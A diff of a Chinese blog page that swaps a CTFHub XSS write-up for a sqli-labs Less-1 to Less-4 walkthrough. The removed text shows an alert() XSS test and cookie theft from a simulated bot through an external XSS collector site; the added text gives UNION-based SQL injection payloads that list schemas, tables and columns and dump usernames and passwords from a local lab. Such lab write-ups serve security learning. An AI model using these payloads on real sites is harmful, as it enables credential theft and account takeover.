@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>CTFHUB(WEB)-XSS |  云芽的博客</title>
+      <title>Less-1~Less-4 |  云芽的博客</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ctf解题/CTFHUB-WEB-XSS"
+  id="post-sqli-labs通关指南/Less-1~Less-4"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CTFHUB(WEB)-XSS
+  Less-1~Less-4
 </h1>
  
 
@@ -85,8 +85,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/04/ctf%E8%A7%A3%E9%A2%98/CTFHUB-WEB-XSS/" class="article-date">
-  <time datetime="2021-10-03T16:53:45.000Z" itemprop="datePublished">2021-10-04</time>
+      <a href="/2021/10/06/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-1~Less-4/" class="article-date">
+  <time datetime="2021-10-06T06:02:39.000Z" itemprop="datePublished">2021-10-06</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/ctf%E8%A7%A3%E9%A2%98/">ctf解题</a>
@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">948</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -106,7 +106,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">5 min</span>
         </span>
     </span>
 </div>
@@ -121,54 +121,146 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="WEB工具配置"><a href="#WEB工具配置" class="headerlink" title="WEB工具配置"></a>WEB工具配置</h3><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><p>题目：</p>
-<img src="/source/images/CTFHUB-WEB-XSS/image-20211006003106095.png" alt="image-20211006003106095" style="zoom:30%;" />
-
-<span id="more"></span>
+  <h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>题目：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211006194458485.png" alt="image-20211006194458485" style="zoom:33%;" />
 
 <p>解题：</p>
-<p>发现第一个输入框与下面Hello后的内容相同，猜测可以通过该输入，改变页面内容。</p>
-<img src="/source/images/CTFHUB-WEB-XSS/image-20211006003153225.png" alt="image-20211006003153225" style="zoom:30%;" />
+<p><strong>单引号闭合</strong></p>
+<p>Sql 语句为SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;</p>
+<p><strong>找到注入点，发现报错回显</strong></p>
+<p>提示传入id的参数，后面跟个单引号<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=1%E2%80%99%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%8A%A5%E9%94%99%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9C%8B%E5%88%B0%E6%98%AF%E5%B7%B2%E7%BB%8F%E9%97%AD%E5%90%88%E4%BA%86%E3%80%82%E4%BB%8E%E6%8A%A5%E9%94%99%E5%86%85%E5%AE%B9%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BAid%E4%BC%A0%E5%85%A5%E7%9A%84%E6%98%AFstr%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%86%E8%A7%A3%E6%88%90%E8%BF%99%E6%A0%B7%E6%9D%A5%E7%9C%8B%E4%BC%A0%E9%80%92%E4%BA%86%E4%B8%80%E4%B8%AA1%E2%80%99%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E5%B9%B6%E4%B8%941%E2%80%99%E7%9A%84%E5%8F%82%E6%95%B0%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8C%85%E8%A3%B9%EF%BC%8C%E6%9C%80%E5%90%8E%E5%86%8D%E6%9C%80%E5%A4%96%E5%B1%82%E4%B8%80%E5%B1%82%E5%8D%95%E5%BC%95%E5%8F%B7&#39;">http://localhost/sqli-labs-master/Less-1/?id=1’，发现报错，这里看到是已经闭合了。从报错内容中可以看出id传入的是str类型，可以分解成这样来看传递了一个1’的参数，并且1’的参数用单引号包裹，最后再最外层一层单引号&#39;</a> ‘ 1’  ‘ LIMIT 0,1 ‘。然后再进行order by 来排序确定字段数。</p>
+<p>此时sql语句为SELECT * FROM users WHERE id=’1’–+’ LIMIT 0,1（简记–+注释掉了多余的‘）</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211006194723632.png" alt="image-20211006194723632" style="zoom:33%;" />
 
-<p>利用输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>进行测试：</p>
-<img src="/images/CTFHUB-WEB-XSS/image-20211004004910837.png" alt="image-20211004004910837" style="zoom:30%;" />
+<p><strong>判断字段数</strong></p>
+<p>在后面加–+注释掉后面的部分。（简记：输入的id=1’…–+，注释符–+将多余的单引号注释掉。）</p>
+<p>利用order by判断字段数，发现字段数为3。（3正常返回，4显示错误）</p>
+<p>注：常见的注释符：%23（#）、-–+、；%00、`、……</p>
+<p>有时候#或–+或%00不一定可以使用，因为它本身可能有过滤，但过滤看不到，所以需要尝试哪个可以用</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211006200958933.png" alt="image-20211006200958933" style="zoom:33%;" />
 
-<p>默认使用get方式发送Payload，成功弹窗:</p>
-<img src="/images/CTFHUB-WEB-XSS/image-20211004004810311.png" alt="image-20211004004810311" style="zoom:50%;" />
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211006200910334.png" alt="image-20211006200910334" style="zoom:33%;" />
 
-<p>经过测试，第二个输入框输入URL时，返回successfully，猜测在后台进行访问。</p>
-<img src="/source/images/CTFHUB-WEB-XSS/image-20211006003641544.png" alt="image-20211006003641544" style="zoom:30%;" />
+<p><strong>判断结果输出位置</strong></p>
+<p>采用联合注入测试输入的值分别对应哪个字段：</p>
+<p>（简记：序号字段放1（不代表真的第一行），登录名字段放2，密码字段放3）</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211007004002099.png" alt="image-20211007004002099" style="zoom:33%;" />
 
-<p>在xss测试平台上注册账号根据提示创建项目：<a target="_blank" rel="noopener" href="https://xss8.cc/login/%E6%88%96http://xsscom.com//index.php?do=login">https://xss8.cc/login/或http://xsscom.com//index.php?do=login</a></p>
-<img src="/source/images/CTFHUB-WEB-XSS/image-20211006004444569.png" alt="image-20211006004444569" style="zoom:30%;" />
+<p>然后查看当前数据库名和数据库版本号。得到表名为security。</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211007002844876.png" alt="image-20211007002844876" style="zoom:33%;" />
 
-<p>把XSS测试平台给出的代码复制到第一个输入框中进行注入</p>
-<img src="/images/CTFHUB-WEB-XSS/image-20211004004113722.png" alt="image-20211004004113722" style="zoom:33%;" />
+<p>补充知识：</p>
+<p>注：UNION操作符用于合并两个或多个SELECT语句的结果集。</p>
+<p>union会执行两句话，而需要前面那句话为空，后面的信息才可以显示出来。</p>
+<p><strong>爆库、爆表、爆列</strong></p>
+<p>爆当前数据库的集合shema：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;">Http://localhost/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211007005148150.png" alt="image-20211007005148150" style="zoom:33%;" />
 
-<p>submit后在第二个框中访问第一个框注入XSS脚本后的网址</p>
-<img src="/images/CTFHUB-WEB-XSS/image-20211004004418547.png" alt="image-20211004004418547" style="zoom:33%;" />
+<p>爆security库的表名：<br><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = ‘security’ –+</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211007005525304.png" alt="image-20211007005525304" style="zoom:33%;" />
 
-<p>点击send1后在XSS测试平台查看注入结果，即可得到flag。</p>
-<img src="/source/images/CTFHUB-WEB-XSS/image-20211006004336944.png" alt="image-20211006004336944" style="zoom:30%;" />
+<p>爆users表的列字段：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name = ‘users’  –+</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211007010115724.png" alt="image-20211007010115724" style="zoom:33%;" />
 
-<p><strong>总结</strong>：<br>xss一般的用途是获取他人的cookie。cookie相当于每个人的登录凭证，如果得到了别人的cookie就可以不用输账号密码，直接登录。所以flag一定不可能藏在自己的cookie里，自己的cookie能直接在浏览器的控制台里知道。题目应该是让我们获得别人的cookie，但这是ctf的题目，不是公共的服务，没有其他用户，所以ctf模拟了一个机器人。我们的目标就是获得这个机器人的cookie，然后”盗它的号”，所以flag也就藏在cookie里了。第二个文本框就是模拟别人点击这个包含xss的链接的情形。（简记：注入xss脚本在他人访问时获取cookie）</p>
-<p><strong>补充知识</strong>：</p>
-<p>XSS攻击（跨站脚本攻击）：</p>
-<p>通常指的是通过利用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5/99347">网页</a>开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者</p>
-<p>恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 </p>
-<p>Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私</p>
-<p>密网页内容、会话和cookie等各种内容。</p>
-<p>从攻击代码的工作方式可以分为三个类型：</p>
-<p>（1）持久型跨站：最直接的危害类型，跨站代码存储在服务器（数据库）。</p>
-<p>（2）非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。</p>
-<p>（3）DOM跨站（DOM XSS）：DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。</p>
-<p>基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。</p>
-<p>常用的XSS攻击手段和目的有：</p>
-<p>1、盗用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/cookie/1119">cookie</a>，获取敏感信息。</p>
-<p>2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java/85979">Java</a>等得到类似的操作。</p>
-<p>3、利用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/iframe/4446518">iframe</a>、frame、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XMLHttpRequest/6788735">XMLHttpRequest</a>或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
-<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
-<p>5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</p>
+<p>爆数据（查询username 和password的值）：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from users –+</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010212315766.png" alt="image-20211010212315766" style="zoom:33%;" />
+
+<p>注：group_concat这个函数可以将多个字符串连接成一个字符串即将结果一行输出</p>
+<p>TABLE表：提供了关于数据库中的表的信息（包括视图）</p>
+<p>COLUMNS表：提供了表中的列信息即字段数</p>
+<p>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
+<p>table_schema=database()只会搜索当前数据库</p>
+<p>group_concat()函数将结果集整合成一句话输出，其间用逗号隔开</p>
+<p>爆破库名：</p>
+<ul>
+<li>union select 1,2,database()</li>
+</ul>
+<p>爆表名：</p>
+<ul>
+<li>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</li>
+<li>union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()</li>
+</ul>
+<p>爆Column名：</p>
+<ul>
+<li>union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()</li>
+</ul>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>注：2-4关判断完闭合类型后参照less-1的做法即可拿到数据。</p>
+<p>题目：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211008113512372.png" alt="image-20211008113512372" style="zoom:33%;" />
+
+<p>解题：</p>
+<p><strong>无符号闭合</strong></p>
+<p>Sql 语句为SELECT * FROM users WHERE id=$id LIMIT 0,1;</p>
+<p>输入?id=1’测试注入点，发现原来已经闭合去掉多余的单引号即可拿到数据，然后根据less-1解题即可。</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211008113338523.png" alt="image-20211008113338523" style="zoom:33%;" />
+
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010010153562.png" alt="image-20211010010153562" style="zoom:33%;" />
+
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>题目：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009141550137.png" alt="image-20211009141550137" style="zoom:33%;" />
+
+<p>解题：</p>
+<p>Sql 语句为SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1;</p>
+<p>测试注入点，发现回显后面多一个）导致无法闭合：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009142325543.png" alt="image-20211009142325543" style="zoom:33%;" />
+
+<p>重构payload，发现可以闭合：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009142556677.png" alt="image-20211009142556677" style="zoom:33%;" />
+
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010011050623.png" alt="image-20211010011050623" style="zoom:33%;" />
+
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>题目：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009143136083.png" alt="image-20211009143136083" style="zoom:33%;" />
+
+<p>解题：</p>
+<p>Sql 语句为SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1;</p>
+<p>测试id=1‘发现没有报错：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009143259703.png" alt="image-20211009143259703" style="zoom:33%;" />
+
+<p>测试双引号（不是两个单引号）：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009143359479.png" alt="image-20211009143359479" style="zoom:33%;" />
+
+<p>重构payload闭合：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009143920776.png" alt="image-20211009143920776" style="zoom:33%;" />
+
+<h3 id="1-4总结"><a href="#1-4总结" class="headerlink" title="1-4总结"></a>1-4总结</h3><h4 id="判断出闭合形式及字段数"><a href="#判断出闭合形式及字段数" class="headerlink" title="判断出闭合形式及字段数"></a>判断出闭合形式及字段数</h4><p>SQL语句的闭合形式大概有以下几种：</p>
+<pre><code>SELECT * FROM `users` WHERE id= 1;#整形闭合
+SELECT * FROM `users` WHERE id=&#39;1&#39;;#单引号闭合
+SELECT * FROM `users` WHERE id=&quot;1&quot;;#双引号闭合
+SELECT * FROM `users` WHERE id=(&#39;1&#39;);#单引号加括号
+SELECT * FROM `users` WHERE id=(&quot;1&quot;);#双引号加括号
+</code></pre>
+<p>注：在没有遇到正确的闭合形式前的注入都会把符号（包括注释符）当做一个整体！</p>
+<p>整形闭合报错：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010023230133.png" alt="image-20211010023230133" style="zoom:33%;" />
+
+<p>单引号闭合报错：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010023326148.png" alt="image-20211010023326148" style="zoom:33%;" />
+
+<p>双引号闭合报错：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010023446397.png" alt="image-20211010023446397" style="zoom:33%;" />
+
+<p>单引号加括号报错：</p>
+<img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211010023400868.png" alt="image-20211010023400868" style="zoom:33%;" />
+
+<p>双引号加括号报错：</p>
+<p>（暂时还没遇到）</p>
+<p>利用order by +整型数字来判断字段数，当超出范围后将报错。</p>
+<h4 id="根据闭合类型进行联合查询"><a href="#根据闭合类型进行联合查询" class="headerlink" title="根据闭合类型进行联合查询"></a>根据闭合类型进行联合查询</h4><p>根据闭合类型再将1变为-1，再结合字段数利用union联合查询。</p>
+<p>union会执行两句话，而需要前面那句话为空（可将数字设为-1），后面的信息才可以显示出来。</p>
+<h4 id="爆库、爆表、爆列、爆数据"><a href="#爆库、爆表、爆列、爆数据" class="headerlink" title="爆库、爆表、爆列、爆数据"></a>爆库、爆表、爆列、爆数据</h4><p>利用sql注入层层爆破获取数据。命令参考第一关。</p>
+<p>爆库：union select 1,2,database()</p>
+<p>爆集合：union select 1,group_concat(schema_name),3 from information_schema.schemata </p>
+<p>爆表：</p>
+<ul>
+<li>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</li>
+<li>union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()</li>
+</ul>
+<p>爆列：union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()</p>
+<p>爆数据：union select 1,group_concat(username),group_concat(password) from users –+</p>
  
       <!-- reward -->
       
@@ -239,7 +331,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/04/ctf%E8%A7%A3%E9%A2%98/CTFHUB-WEB-XSS/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/06/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-1~Less-4/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -250,19 +342,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/10/06/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-1~Less-4/" class="article-nav-link">
+      <a href="/2021/10/19/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-5/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Less-1~Less-4
+            Less-5
           
         </div>
       </a>
     
     
-      <a href="/2021/10/04/ctf%E8%A7%A3%E9%A2%98/CTFHUB-WEB-SQL%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+      <a href="/2021/10/04/ctf%E8%A7%A3%E9%A2%98/CTFHUB-WEB-XSS/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">CTFHUB(WEB)-SQL注入</div>
+        <div class="article-nav-title">CTFHUB(WEB)-XSS</div>
       </a>
     
   </nav>
